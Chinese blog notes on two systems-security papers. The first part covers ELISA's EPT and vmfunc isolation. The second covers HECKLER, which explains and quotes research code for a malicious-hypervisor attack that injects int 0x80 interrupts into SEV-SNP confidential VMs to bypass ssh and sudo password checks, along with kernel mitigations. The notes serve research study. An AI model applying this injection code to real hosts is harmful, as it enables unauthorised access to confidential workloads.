<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *) ctx-&gt;apt_mem, (<span class="type">void</span> *) ctx-&gt;pt.pg[<span class="number">0</span>].va, <span class="number">0x1000</span>);</span><br><span class="line">assert(!gva2hpa((<span class="type">uint64_t</span>) ctx-&gt;apt_mem, &amp;hpa));</span><br><span class="line">pt_map(&amp;ctx-&gt;ept, ((<span class="type">uint64_t</span>) <span class="number">-1</span>) &amp; EPT_ADDR_MASK, hpa, EPT_R | EPT_W | <span class="comment">/*EPT_X | EPT_U |*/</span> EPT_MT, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<p>ept把0xfffffffff映射到apt_mem的hpa 这样ept四级页表都会有最后一项</p>
<p>ae是所有页表的最后一个位置</p>
<p>遍历ept 把512项的每一项都指向ae 即下一级页表的最后一个位置 这样最终会指向apt_mem的hpa 如果已经有指向了 则递归把下一级的指向apt_mem</p>
<p>改变整个地址空间的映射 不是遍历整个地址空间为每个va创建映射 而是直接修改page table entry即可</p>
<p>最终配置完的EPT guest自己所有的GPA都会被映射到apt_mem的HPA  存储的数据是guest page table的root page table</p>
<p>超出范围的GPA被映射到指定的位置  </p>
<p>gate EPT会被放到eptp_list的最后一个位置</p>
<p>set_rendezvous_point_eptp_list_hpa 把eptp_list记录到host</p>
<p>read等待client结束</p>
<p>配置完成后 多了两个ept  并且ept的合法GPA范围都指向了一起配置好的pt</p>
</li>
<li><h4 id="elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出"><a href="#elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出" class="headerlink" title="elisa_client 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出"></a><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L72"><code>elisa_client</code></a> 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出</h4><p> 由elisa-util-exec调用到elisa_client 传入client_cb </p>
<p>拿到vcpuid</p>
<p>client_cb 啥也不干</p>
<p><code>request_gva = (uint64_t) gate_entry_page + 0x1000;</code></p>
<p>elisa_guest_activate 写入eptp_list</p>
<p>elisa__client_work 禁止中断 elisa_gate_entry</p>
<p>____asm_impl_client 定义了elisa_gate_entry  执行vmfunc(511) 切换到gate ept</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.src_gxa = (<span class="type">uint64_t</span>) gate_ctx_page,</span><br><span class="line">.dst_gva = requested_gva + <span class="number">0x1000</span> * <span class="number">0</span>,</span><br><span class="line">.dst_gpa = BASE_GPA + <span class="number">0x1000</span> * <span class="number">0</span>,</span><br></pre></td></tr></table></figure>

<p>此使pc正好指向下一个page 这个page通过之前配置好的pt和ept 会被映射到gate_ctx_page</p>
<p>立即切换之后 并不会马上用到stack 因此可以先写一些不需要stack的汇编 然后配置rsp到事先用mmap准备好的栈位置</p>
<p>gate执行完(code page上半部分) vmfunc 切换视角 继续执行的是sub page的下半部分 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;.globl __RUNTIME_VALUE_2 \n\t&quot;</span><br><span class="line">&quot;__RUNTIME_VALUE_2: \n\t&quot;</span><br><span class="line">&quot;movabs $0x123456789abcdef0, %rax \n\t&quot; // 0x123456789abcdef0 (pointer to entry point function) is replaced at initialization</span><br><span class="line">&quot;call *%rax \n\t&quot;</span><br><span class="line">&quot;movq %rax, %rbx \n\t&quot; // save return value on rbx</span><br></pre></td></tr></table></figure>

<p>entry_function中的gva是事先准备好映射的 在shared memory例子中 shm_memory_ptr的gva和src_gva相同 gva不变 通过修改映射访问到host物理内存上的事先用mmap shared准备好的共享内存</p>
<p>entry_function的映射在<a target="_blank" rel="noopener" href="https://github.com/yasukata/libelisa-extra/blob/master/include/libelisa_extra/map.h">libelisa-extra&#x2F;include&#x2F;libelisa_extra&#x2F;map.h at master · yasukata&#x2F;libelisa-extra (github.com)</a>中建立 与shared_memory相同 src_gva&#x3D;dst_gva 不变 dst_gpa一个个往后放</p>
</li>
</ul>
<p>def和sub共享 修改def EPT？ 在启动的时候先让manager VM和guest VM通过qemu提供的共享内存</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/stray2b/article/details/128896078">qemu-kvm Hypervisor：ivshmem-CSDN博客</a></p>
<p>managerVM可以知道共享内存的地址  然后建立和guest sub的共享 达到guest def&lt;&#x3D;&gt;manager def&lt;&#x3D;&gt;guest sub共享的效果</p>
<p>gate_entry_page有三个连续的page</p>
<p>gate_ctx_page和sub_ctx_page共4个连续的page</p>
<p>这些page代码通过VM kernel加载以后 放到host真实的物理内存中</p>
<p>随后通过修改EPT 改变了guest眼中的内存布局(例如物理内存中gate_ctx_page-&gt;eptp_list-&gt;sub_ctx_pape但是GPA视角gate_ctx_page-&gt;eptp_list-&gt;stack)</p>
<p>guest vm 用户态代码<a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-nop/blob/master/main.c">elisa-app-nop&#x2F;main.c at master · yasukata&#x2F;elisa-app-nop (github.com)</a> 其中elisa__client_work调用elisa_gate_entry</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-util-exec/blob/master/main.c">elisa-util-exec&#x2F;main.c at master · yasukata&#x2F;elisa-util-exec (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/libelisa/blob/master/client.c">libelisa&#x2F;client.c at master · yasukata&#x2F;libelisa (github.com)</a> ____asm_impl_client 定义了elisa_gate_entry 用到vmfunc 执行这行以后去哪了？</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/libelisa/blob/master/server.c#L43">libelisa&#x2F;server.c at master · yasukata&#x2F;libelisa (github.com)</a>对应了论文中gate entry的header</p>
<p>vmfunc理论上是某个page的最后一个指令 因此non-default EPT不会再映射开始的vmfunc这个page</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/06/02/papers/HECKLER/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/06/02/papers/HECKLER/" class="post-title-link" itemprop="url">HECKLER: Breaking Confidential VMs with Malicious Interrupts  </a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-06-02 21:08:42" itemprop="dateCreated datePublished" datetime="2024-06-02T21:08:42+08:00">2024-06-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-02-04 20:53:17" itemprop="dateModified" datetime="2025-02-04T20:53:17+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>2.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler">ahoi-attacks&#x2F;heckler: Breaking Confidential VMs with Malicious Interrupts (USENIX Security 2024) (github.com)</a></p>
<h1 id="HECKLER-Breaking-Confidential-VMs-with-Malicious-Interrupts"><a href="#HECKLER-Breaking-Confidential-VMs-with-Malicious-Interrupts" class="headerlink" title="HECKLER: Breaking Confidential VMs with Malicious Interrupts"></a>HECKLER: Breaking Confidential VMs with Malicious Interrupts</h1><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>32 使用int 0x80 通过中断实现系统调用</p>
<p>64 syscall指令不通过中断实现</p>
<p><a target="_blank" rel="noopener" href="https://sdww0.github.io/2023/03/09/x86_64-%E4%B8%AD%E6%96%AD-%E5%BC%82%E5%B8%B8%E4%B8%8Esyscall/">x86_64-中断，异常与syscall | sdww0的博客</a></p>
<p><a target="_blank" rel="noopener" href="https://maodanp.github.io/2019/05/26/linux-syscall/">Linux的系统调用 (maodanp.github.io)</a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>中断有很多种 恶意VMM可以向CVM自由注入虚拟中断</p>
<ul>
<li>SEV 所有虚拟中断都会被成功转发给CVM执行 并且有些是可以转发给用户态自定义的信号处理函数的</li>
<li>TDX 中断号小于31的会被硬件过滤掉（除了NMI）</li>
</ul>
<p>附录Table 6 中断号0x80就是syscall  后续按syscall处理 从eax等寄存器中拿参数 然后eax放返回值 然后返回cvm的pc</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>恶意VMM向CVM注入syscall的虚拟中断int 0x80</p>
<p>假如guest 有个gadget是准备eax ecx等参数</p>
<p>恶意VMM注入一个int 0x80 (假设guest准备好的eax是4 buf是共享内存)</p>
<p>那么CVM就会在自己的中断处理函数中把secret写出来</p>
<p>实际上很难找这种gadget 所以只找了 参数和返回值都是仅有eax的  40&#x2F;328</p>
<p>目标是改eax 怎么改？ 利用错误代码  syscall 0表示重启 userspace会报错 这样eax就是-4 可以绕过ssh检查</p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl">linux&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_32.tbl at master · torvalds&#x2F;linux (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/restart_syscall.2.html">RESTART_SYSCALL - Linux手册页-之路教程 (onitroad.com)</a></p>
<p>巧合：</p>
<ol>
<li>ssh返回值非零表示通过检查</li>
<li>syscall在报错的时候会返回非零值</li>
</ol>
<p>int 0x0是FPE 例如除0 溢出等 用户自定义处理函数</p>
<p>如果这些处理函数改变了程序某些状态 例如一个变量 那可以被恶意VMM利用</p>
<h2 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2><p>哪里注入？ 如何判断？</p>
<p>第六章 第七章 附录A</p>
<p>为了定位需要注入攻击的代码页位置 需要提前profile</p>
<ol>
<li>启动阶段记录page 这些page是需要被排除的</li>
<li>尝试很多遍需要攻击的application(例如很多次ssh) 拿到一个固定的page序列</li>
</ol>
<p>通过page fault拿到这个page序列</p>
<p>当ssh验证的时候 访问page的序列是固定的  数第几个是预期的然后插入就行</p>
<ol>
<li>offline phase：离线采样 拿到page序列</li>
<li>online phase：在线采样 找到需要插入中断的位置</li>
<li>inject interrupt：插入中断</li>
</ol>
<p>page序列如何找到两个gadget？</p>
<p>ssh：</p>
<p>sudo：写一个C程序调用PAM module(.so)就可以了 循环访问这两个page</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler/blob/master/userspace/sudo/profile_pam.c">heckler&#x2F;userspace&#x2F;sudo&#x2F;profile_pam.c at master · ahoi-attacks&#x2F;heckler (github.com)</a></p>
<p>sudo不需要offline学fapp的过程 只要ssh成功以后用自己跑的程序循环访问 然后看频率最高的两个就可以了</p>
<p>判断GPA相同  要求进程不变 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> mm_answer_authpassword = gadgets[<span class="number">0</span>]</span><br><span class="line"> auth_password = gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sequence of interest:</span></span><br><span class="line"><span class="comment"># mm_answer_authpassword -&gt; auth_password -&gt; mm_answer_authpassword</span></span><br><span class="line"><span class="keyword">if</span> gpa == mm_answer_authpassword \</span><br><span class="line"><span class="keyword">and</span> last_gpa == auth_password \</span><br><span class="line"><span class="keyword">and</span> lastlast_gpa == mm_answer_authpassword:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Injecting interrupt, sequence &quot;</span></span><br><span class="line">    <span class="string">f&quot;\[<span class="subst">&#123;<span class="built_in">hex</span>(lastlast_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(last_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class="line">    h.heckler_inject(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<p>ssh使用sshd</p>
<p>sudo使用一个共享库</p>
<blockquote>
<p>It uses PAM to perform password authentication by calling the pam_unix shared library which has our code gadget from Sec. 5. The Linux kernel executes shared libraries from the same physical addresses.  </p>
</blockquote>
<p>插入中断代码 用的是sev-step提供的框架   通过ioctl 处理 然后kvm_dev_ioctl处理</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler/blob/master/userspace/sev-step/sev-step-lib/sev_step_api.c#L241">heckler&#x2F;userspace&#x2F;sev-step&#x2F;sev-step-lib&#x2F;sev_step_api.c at master · ahoi-attacks&#x2F;heckler (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler-linux/commit/0aa0129654ddbcdb5043fde1229b710799da2f6f">heckler: introduce nx page fault and track · ahoi-attacks&#x2F;heckler-linux@0aa0129 (github.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heckler_config.do_inject_vector = <span class="number">1</span>;</span><br><span class="line">heckler_config.inject_vector = inj.<span class="built_in">vector</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">heckler_on_svm_vcpu_enter_exit</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vcpu_svm</span> *<span class="title">svm</span> =</span> to_svm(vcpu);</span><br><span class="line">    u64 fault_address = svm-&gt;vmcb-&gt;control.exit_info_2;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;heckler_config.config_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (heckler_config.do_inject_vector == <span class="number">2</span>) &#123;</span><br><span class="line">        heckler_config.do_inject_vector = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pr_info(<span class="string">&quot;apic clear isr: interrupt: %d\n&quot;</span>,</span><br><span class="line">            heckler_config.inject_vector);</span><br><span class="line"></span><br><span class="line">        kvm_apic_clear_irr(vcpu, heckler_config.inject_vector);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (svm-&gt;vmcb-&gt;control.exit_code == SVM_EXIT_NPF &amp;&amp;</span><br><span class="line">        heckler_config.do_inject_vector == <span class="number">1</span>) &#123;</span><br><span class="line">        heckler_config.do_inject_vector = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        pr_info(<span class="string">&quot;injecting: vector: %d, npf: %llx\n&quot;</span>,</span><br><span class="line">                heckler_config.inject_vector, fault_address);</span><br><span class="line"></span><br><span class="line">        svm-&gt;vmcb-&gt;control.event_inj = heckler_config.inject_vector |</span><br><span class="line">            SVM_EVTINJ_VALID |</span><br><span class="line">            SVM_EVTINJ_TYPE_INTR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutex_unlock(&amp;heckler_config.config_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>run之前插入中断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heckler_on_svm_vcpu_enter_exit(vcpu);</span><br><span class="line">svm_vcpu_enter_exit(vcpu);</span><br></pre></td></tr></table></figure>



<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>看上一个pc是不是int 0x80</p>
<p>直接把32位的模拟给禁止了</p>
<p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b82a8dbd3d2f4563156f7150c6f2ecab6e960b30">x86&#x2F;coco: Disable 32-bit emulation by default on TDX and SEV - kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git - Linux kernel source tree</a></p>
<p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4116bfc44621882556bbf70f5284fbf429a5cf6">x86&#x2F;tdx: Allow 32-bit emulation by default - kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git - Linux kernel source tree</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init idt _setup_traps(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	idt_setup_from_table(idt_table, def_idts, ARRAY_SIZE(def_idts), <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (ia32_enabled())</span><br><span class="line">		idt_setup_from_table(idt_table, ia32_idt, ARRAY_SIZE(ia32_idt), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">24593.pdf (amd.com)</a></p>
<p>15.36.16</p>
<p><a target="_blank" rel="noopener" href="https://www.amd.com/en/resources/product-security/bulletin/amd-sb-3008.html">Disrupting AMD SEV-SNP on Linux® With Interrupts</a></p>
<p>认为是软件实现的问题</p>
<p>SNP-guest可以自己设置一个feature bit来达到restricted injection只允许一个新的中断#HV</p>
<p>然后guest内的#HV handler处理中断</p>
<p>但是只转发不过滤还是没用的 还是可能转发一个inx 0x80做syscall</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>python模块和kvm的通信也是通过sev step</p>
<p>kvm:</p>
<p>kvm_tdp_mmu_page_fault-&gt;page_fault_handle_page_track-&gt;heckler_on_page_fault</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">heckler_on_page_fault</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu, <span class="keyword">struct</span> kvm_page_fault *fault)</span> &#123;</span><br><span class="line">    <span class="type">int</span> active = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_slot</span> *<span class="title">slot</span>;</span></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    slot = kvm_vcpu_gfn_to_memslot(vcpu, fault-&gt;gfn);</span><br><span class="line">    <span class="keyword">if</span> (slot != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        active = kvm_slot_page_track_is_active(vcpu-&gt;kvm,</span><br><span class="line">                                               slot,</span><br><span class="line">                                               fault-&gt;gfn,</span><br><span class="line">                                               KVM_PAGE_TRACK_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (active) &#123;</span><br><span class="line">            __do_untrack_single_page(vcpu,</span><br><span class="line">                                     fault-&gt;gfn);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">            kvm_vcpu_exec_unprotect_gfn(vcpu,</span><br><span class="line">                                        fault-&gt;gfn,</span><br><span class="line">                                        <span class="literal">true</span>);</span><br><span class="line">            __clear_nx_on_page(vcpu,</span><br><span class="line">                               fault-&gt;gfn);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pr_info(<span class="string">&quot;c:%d active: %d pf: %llx x:%d p:%d w:%d u:%d &quot;</span></span><br><span class="line">            <span class="string">&quot;rsvd %d pref:%d tdp:%d\n&quot;</span>,</span><br><span class="line">            uspt_ctx != <span class="literal">NULL</span>, active, fault-&gt;addr, fault-&gt;exec,</span><br><span class="line">            fault-&gt;present, fault-&gt;write, fault-&gt;user, fault-&gt;rsvd,</span><br><span class="line">            fault-&gt;prefetch, fault-&gt;is_tdp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uspt_ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (active) &#123;</span><br><span class="line">        <span class="type">usp_page_fault_event_t</span> pf_event = &#123;</span><br><span class="line">            .faulted_gpa = (<span class="type">uint64_t</span>)(fault-&gt;addr),</span><br><span class="line">            .is_decrypted_vmsa_data_valid = <span class="literal">false</span>,</span><br><span class="line">            .has_vmsa_blob = <span class="number">0</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ret = usp_send_and_block(uspt_ctx,</span><br><span class="line">                                 PAGE_FAULT_EVENT,</span><br><span class="line">                                 (<span class="type">void</span> *)&amp;pf_event);</span><br><span class="line">        <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                pr_info(<span class="string">&quot;usp_send_and_block aborted due to force_reset\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="comment">//no error</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: &#123;</span><br><span class="line">                pr_info(<span class="string">&quot;usp_send_and_block: Failed in svm_vcpu_run with %d&quot;</span>, ret);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyObject* <span class="title function_">heckler_block_until_event</span><span class="params">(PyObject* self, PyObject* args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> gpa;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (event_buffer != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;memory leak? freeing event_buffer\n&quot;</span>);</span><br><span class="line">		free_usp_event(event_type, event_buffer);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Do not block the GIL on block until event</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	Py_BEGIN_ALLOW_THREADS</span><br><span class="line">		ret = usp_block_until_event(&amp;ctx, &amp;event_type, &amp;event_buffer);</span><br><span class="line">	Py_END_ALLOW_THREADS</span><br><span class="line">	<span class="title function_">if</span> <span class="params">(ret == SEV_STEP_ERR_ABORT)</span></span><br><span class="line">	&#123;</span><br><span class="line">		ret = SEV_STEP_ERR_ABORT;</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ret == SEV_STEP_ERR)</span><br><span class="line">		<span class="keyword">if</span> (event_type != PAGE_FAULT_EVENT)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s:%d : expected page fault event, got %d\n&quot;</span>, __FILE__, __LINE__, event_type);</span><br><span class="line">			ret = EXIT_CODE_ERR;</span><br><span class="line">			__clean_up();</span><br><span class="line">			<span class="keyword">goto</span> end;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="type">usp_page_fault_event_t</span>* pf_event = (<span class="type">usp_page_fault_event_t</span>*)event_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (debug)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(BHGRN <span class="string">&quot;Pagefault Event: &#123;GPA:0x%lx&#125;\n&quot;</span>reset, pf_event-&gt;faulted_gpa);</span><br><span class="line">	&#125;</span><br><span class="line">	gpa = pf_event-&gt;faulted_gpa;</span><br><span class="line">end:</span><br><span class="line">	<span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		gpa = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Py_BuildValue(<span class="string">&quot;&#123;s:i,s:K&#125;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;ret&quot;</span>, ret, <span class="string">&quot;gpa&quot;</span>, gpa);</span><br><span class="line">&#125;</span><br><span 